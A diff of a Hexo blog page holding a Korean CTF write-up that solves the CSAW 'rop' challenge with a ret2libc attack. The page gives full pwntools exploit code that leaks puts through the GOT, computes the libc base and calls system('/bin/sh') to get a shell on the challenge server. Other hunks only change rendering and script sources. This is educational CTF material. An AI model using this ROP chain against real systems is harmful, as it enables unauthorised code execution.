@@ -295,7 +295,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper post focus' style="display: none;">
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
           
             <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg"></div>
           
@@ -410,20 +410,109 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>필요한 부분들을 하나씩 찾아봅시다.</p>
 <p>일단 입력값이 저장되는 v4 버퍼의 크기는 rbp-20(32byte) 입니다.</p>
 <p>그리고 함수 릭을 할려면 plt, got 값을 각각 구해야하는데 gdb를 통해서 볼수도 있지만 pwntools를 이용하면 시간 절약이 가능합니다.</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python3</span><br>  <br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;pwn.chal.csaw.io&#x27;</span>,<span class="hljs-number">5016</span>)<br><br>e = ELF(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br><br>puts_plt = e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>puts_got = e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br></code></pre></td></tr></table></figure>
+<pre><code class="py">#!/usr/bin/python3
+
+from pwn import *
+
+p = remote(&#39;pwn.chal.csaw.io&#39;,5016)
+
+e = ELF(&#39;./rop&#39;)
+
+puts_plt = e.plt[&#39;puts&#39;]
+
+puts_got = e.got[&#39;puts&#39;]</code></pre>
 <p>이런식으로 하면 puts 함수의 plt, got를 각각 구할 수 있습니다.</p>
 <p>함수 오프셋도 똑같이 libc 파일을 불러와서 symbols로 구해주면 되니깐 이하 생략하겠습니다~</p>
 <p>그리고 rop에서 중요한 부분은 함수 릭을 할때 함수의 인자를 정리해줘야 해서 pop gadget 필요한데 이것도 ROPgadget 도구를 이용하면 쉽게 구합니다.</p>
 <p>puts 함수의 인자를 정리해줄려면 pop ret로 해주면 되기 때문에 pop rdi ret 가젯을 사용하면 됩니다.</p>
 <p>그럼 이제 함수 릭까지의 익스코드를 정리해보면 아래와 같습니다</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs py">payload = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">40</span> <span class="hljs-comment"># 32byte + 8</span><br><br>payload += p64(pr)<br><br>payload += p64(puts_got)<br><br>payload += p64(puts_plt)<br><br>payload += p64(main)<br><br>p.sendlineafter(<span class="hljs-string">&quot;\n&quot;</span>, payload)<br><br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br><br>print(<span class="hljs-built_in">hex</span>(puts_addr))<br></code></pre></td></tr></table></figure>
+<pre><code class="py">payload = &quot;A&quot;*40 # 32byte + 8
+
+payload += p64(pr)
+
+payload += p64(puts_got)
+
+payload += p64(puts_plt)
+
+payload += p64(main)
+
+p.sendlineafter(&quot;\n&quot;, payload)
+
+puts_addr = u64(p.recv(6).ljust(8,&quot;\x00&quot;))
+
+print(hex(puts_addr))</code></pre>
 <p>아까 구했던 값들을 그대로 이용해서 함수릭을 해주면 됩니다.</p>
 <p>중간에 main symbols을 구해서 마지막에 리턴해주는 이유는 함수 leak을 하고 다시 main 함수로 리턴해서 초기의 상태로 만들어서 공격을 수행해야 하는 간단한 이유입니다.</p>
 <p>이제 남은 일은 libc base, system, binsh의 주소를 구해서 sh을 실행시켜주면 끝납니다.</p>
 <p>오프셋 계산은 매우 간단합니다.</p>
 <p>libc base 주소를 구해서 그냥 offset를 더해주면 필요한 함수의 주소가 나옵니다.</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">libc_base = puts_addr - puts_offset<br><br>system_addr = libc_base + system_offset<br><br>binsh_addr = libc_base + binsh_offset<br></code></pre></td></tr></table></figure>
-<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;pwn.chal.csaw.io&#x27;</span>,<span class="hljs-number">5016</span>)<br><br>e = ELF(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><br>pr = <span class="hljs-number">0x0000000000400683</span> <span class="hljs-comment"># pop rdi ret</span><br><br>ret = <span class="hljs-number">0x000000000040048e</span> <span class="hljs-comment"># ret</span><br><br>puts_plt = e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>puts_got = e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>main = e.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>puts_offset = libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>system_offset = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>binsh_offset = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br><br>payload = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">40</span> <span class="hljs-comment"># 32byte + 8</span><br><br>payload += p64(pr)<br><br>payload += p64(puts_got)<br><br>payload += p64(puts_plt)<br><br>payload += p64(main)<br><br>p.sendlineafter(<span class="hljs-string">&quot;\n&quot;</span>, payload)<br><br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br><br>libc_base = puts_addr - puts_offset<br><br>system_addr = libc_base + system_offset<br><br>binsh_addr = libc_base + binsh_offset<br><br>payload = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">40</span><br><br>payload += p64(pr)<br><br>payload += p64(binsh_addr)<br><br>payload += p64(ret)<br><br>payload += p64(system_addr)<br><br>p.sendline(payload)<br><br>p.interactive()<br><br>p.close()<br></code></pre></td></tr></table></figure>
+<pre><code class="py">libc_base = puts_addr - puts_offset
+
+system_addr = libc_base + system_offset
+
+binsh_addr = libc_base + binsh_offset</code></pre>
+<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><pre><code class="py">#!/usr/bin/python3
+
+from pwn import *
+
+p = remote(&#39;pwn.chal.csaw.io&#39;,5016)
+
+e = ELF(&#39;./rop&#39;)
+
+libc = ELF(&#39;./libc-2.27.so&#39;)
+
+pr = 0x0000000000400683 # pop rdi ret
+
+ret = 0x000000000040048e # ret
+
+puts_plt = e.plt[&#39;puts&#39;]
+
+puts_got = e.got[&#39;puts&#39;]
+
+main = e.symbols[&#39;main&#39;]
+
+puts_offset = libc.symbols[&#39;puts&#39;]
+
+system_offset = libc.symbols[&#39;system&#39;]
+
+binsh_offset = next(libc.search(&quot;/bin/sh&quot;))
+
+payload = &quot;A&quot;*40 # 32byte + 8
+
+payload += p64(pr)
+
+payload += p64(puts_got)
+
+payload += p64(puts_plt)
+
+payload += p64(main)
+
+p.sendlineafter(&quot;\n&quot;, payload)
+
+puts_addr = u64(p.recv(6).ljust(8,&quot;\x00&quot;))
+
+libc_base = puts_addr - puts_offset
+
+system_addr = libc_base + system_offset
+
+binsh_addr = libc_base + binsh_offset
+
+payload = &quot;A&quot;*40
+
+payload += p64(pr)
+
+payload += p64(binsh_addr)
+
+payload += p64(ret)
+
+payload += p64(system_addr)
+
+p.sendline(payload)
+
+p.interactive()
+
+p.close()</code></pre>
+
   
   
     
@@ -436,7 +525,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <i class="fas fa-bookmark fa-fw" aria-hidden="true"></i><span>Related Posts</span>
     </section>
     <section class='body'>
-      <div class="vlts-rps"><a class="item" href="/2020/11/21/bob-bisc-201129/" title="BISC CTF 2020(oldschool) write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">BISC CTF 2020(oldschool) write up</span></a><a class="item" href="/2020/12/26/christmasctf-201226/" title="ChristmasCTF 2019 Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">ChristmasCTF 2019 Write up</span></a><a class="item" href="/2020/04/10/angstormctf-200410/" title="angstorm ctf 2020 Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload placeholder" data-srcset="/img/header/cat.jpeg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">angstorm ctf 2020 Write up</span></a></div></section></div>
+      <div class="vlts-rps"><a class="item" href="/2020/11/21/bob-bisc-201129/" title="BISC CTF 2020(oldschool) write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">BISC CTF 2020(oldschool) write up</span></a><a class="item" href="/2020/12/26/christmasctf-201226/" title="ChristmasCTF 2019 Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">ChristmasCTF 2019 Write up</span></a><a class="item" href="/2020/04/10/angstormctf-200410/" title="angstorm ctf 2020 Write up" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">angstorm ctf 2020 Write up</span></a></div></section></div>
       
       
       
@@ -481,8 +570,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class='prev' href='/2020/09/17/linux-iftop-200917/'>
           <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>Linux[iftop] Example</p>
-          <p class='content'>Install12$ sudo apt-get install libpcap-dev$ sudo apt-get install iftop
-Command1$ sudo iftop # 라이...</p>
+          <p class='content'>Install$ sudo apt-get install libpcap-dev
+$ sudo apt-get install iftop
+Command$ sudo iftop # 라이브로...</p>
         </a>
       
       
@@ -704,7 +794,7 @@ var loadCSS = function( href, before, media, attributes ){
   loadCSS("https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css", window.volantis.loadcss);
   
   
-  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@10.5.0/styles/atelier-cave-dark.css", window.volantis.loadcss);
+  loadCSS("https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/styles/solarized-light.min.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -783,7 +873,7 @@ var loadCSS = function( href, before, media, attributes ){
   function loadIssuesJS() {
     if ($(".md").find(".issues-api").length == 0) return;
 	
-	  loadScript('https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.0/source/js/issues.min.js');
+	  loadScript('/js/issues.js');
 	
   };
   $(function () {
@@ -901,29 +991,6 @@ var loadCSS = function( href, before, media, attributes ){
 
 
 
-   <script type="text/javascript">
-  loadScript("https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js")
-  function pjax_scrollrebeal() {
-    ScrollReveal().reveal('.l_main .reveal', {
-      distance: '32px',
-      duration: '800',
-      interval: '20',
-      scale: '1',
-      easing: 'ease-out'
-    });
-  }
-  $(function () {
-  var checkScrollReveal = setInterval(function () {
-    if ($("#safearea").css("display")!="block") return
-    if (typeof ScrollReveal=="undefined") return
-    clearInterval(checkScrollReveal)
-	pjax_scrollrebeal();
-  }, 100)
-  });
-  volantis.pjax.push(pjax_scrollrebeal)
-</script>
-
-
 
 
 
@@ -1025,7 +1092,7 @@ var loadCSS = function( href, before, media, attributes ){
 
 
   
-<script src="https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.0/source/js/app.min.js"></script>
+<script src="/js/app.js"></script>
 
 
 
@@ -1037,7 +1104,7 @@ const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );
 
 $('.input.u-search-input').one('focus',function(){
 	
-		loadScript('https://cdn.jsdelivr.net/npm/hexo-theme-volantis@4.3.0/source/js/search/hexo.min.js',setSearchService);
+		loadScript('/js/search/hexo.js',setSearchService);
 	
 })
 
